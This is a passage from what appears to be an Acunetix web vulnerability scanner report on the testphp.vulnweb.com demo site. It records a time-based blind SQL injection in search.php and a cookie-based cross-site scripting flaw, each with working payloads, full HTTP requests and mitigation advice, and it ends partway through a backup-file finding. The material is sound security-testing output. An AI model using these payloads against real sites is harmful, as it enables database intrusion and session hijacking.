       <Details><![CDATA[URL encoded POST input <b><font color="dark">searchFor</font></b> was set to <b><font color="dark">if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/</font></b><br/><br/>Tests performed: <ul><li>if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; <b>6.312 s</b></li><li>if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'&quot;XOR(if(now()=sysdate(),sleep(9),0))OR&quot;*/ =&gt; <b>9.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.328 s</b></li><li>if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'&quot;XOR(if(now()=sysdate(),sleep(3),0))OR&quot;*/ =&gt; <b>3.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.312 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.313 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.328 s</b></li><li>if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; <b>6.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.313 s</b></li></ul><br/> Original value: <b>the</b>]]></Details>
       <Affects><![CDATA[/search.php]]></Affects>
       <Parameter><![CDATA[searchFor]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /search.php?test=query HTTP/1.1
Content-Length: 146
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

goButton=go&amp;searchFor=if(now()=sysdate()%2csleep(0)%2c0)/*'XOR(if(now()=sysdate()%2csleep(0)%2c0))OR'&quot;XOR(if(now()=sysdate()%2csleep(0)%2c0))OR&quot;*/]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:54:30 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4087
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="80" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[Cookie input <b><font color="dark">mycookie</font></b> was set to <b><font color="dark">3'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;URlJ(9796)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/AJAX/showxml.php]]></Affects>
       <Parameter><![CDATA[mycookie]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /AJAX/showxml.php HTTP/1.1
Cookie: mycookie=3'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt%20&gt;URlJ(9796)&lt;/ScRiPt&gt;
Referer: http://testphp.vulnweb.com:80/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:02:35 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 73
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="81" color="orange">
       <Name><![CDATA[Backup files]]></Name>
       <ModuleName><![CDATA[Scripting (Backup_File.script)]]></ModuleName>
       <Details><![CDATA[This file was found using the pattern <font color="dark"><b>${fileName}.bak</b></font>.<br/>Original filename: <font color="dark"><b>index.php</b></font><br/>Source code pattern found: <code><pre wrap="virtual">&lt;?PHP require_once(&quot;database_connect.php&quot;); ?&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;&lt;!-- InstanceBegin template=&quot;/Templates/main_dynamic_template.dwt.php&quot; codeOutsideHTMLIsLocked=&quot;false&quot; --&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-2&quot;&gt;

&lt;!-- InstanceBeginEditable name=&quot;document_title_rgn&quot; --&gt;
&lt;title&gt;Home of WASP Art&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;
&lt;!-- InstanceBeginEditable name=&quot;headers_rgn&quot; --&gt;
&lt;!-- here goes headers headers --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;
&lt;!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName==&quot;Netscape&quot;)&amp;&amp;(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
